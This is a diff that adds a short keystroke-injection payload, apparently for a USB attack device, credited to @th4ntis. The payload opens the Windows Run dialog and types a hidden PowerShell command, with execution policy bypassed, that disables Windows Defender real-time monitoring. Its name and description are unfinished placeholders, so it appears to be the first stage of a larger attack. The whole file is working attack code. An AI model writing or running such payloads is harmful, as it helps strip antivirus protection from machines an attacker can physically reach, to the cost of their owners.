@@ -1,0 +1,10 @@
+REM Name:  Coming Soon
+REM Author: @th4ntis
+REM Description: Disables WindowDefender, 
+
+DELAY 1500
+GUI r
+DELAY 300
+REM Disables Windows Defender
+STRINGLN powershell -NonI -NoP -ep ByPass -W hidden Set-MpPreference -DisableRealtimeMonitoring $true; 
+DELAY 300
